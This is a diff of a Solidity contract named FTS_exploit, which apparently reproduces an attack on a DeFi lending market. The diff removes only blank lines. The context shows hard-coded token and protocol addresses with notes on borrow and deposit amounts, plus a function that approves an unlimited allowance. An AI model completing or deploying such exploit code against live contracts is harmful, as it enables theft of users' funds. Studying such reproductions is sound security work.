@@ -68,7 +68,6 @@ contract FTS_exploit{
     address public constant fBETH = 0x8ed1f4c1326E5d3C1b6E99Ac9E5EC6651E11e3Da;                      //getCash, borrow 3123556747684528478
     address public constant fSHIB = 0x073C0AC03e7C839C718A65E0C4D0724Cc0bd2B5f;                      //getCash, borrow 990248211251809065999207892
 
-
     address public constant MAHA = 0xCE86F7fcD3B40791F63B86C3ea3B8B355Ce2685b;                      //approve BorrowerOperations
     address public constant ARTH = 0xB69A424Df8C737a122D0e60695382B3Eec07fF4B;                      //approve ARTH_usd
     address public constant ARTH_usd = 0x88fd584dF3f97c64843CD474bDC6F78e398394f4;                  //deposit 1000000000000000000000000000
@@ -81,7 +80,6 @@ contract FTS_exploit{
 
     function set_approve() public{
         IERC20(FTS).approve(fFTS, type(uint).max);
-
     }
 
 
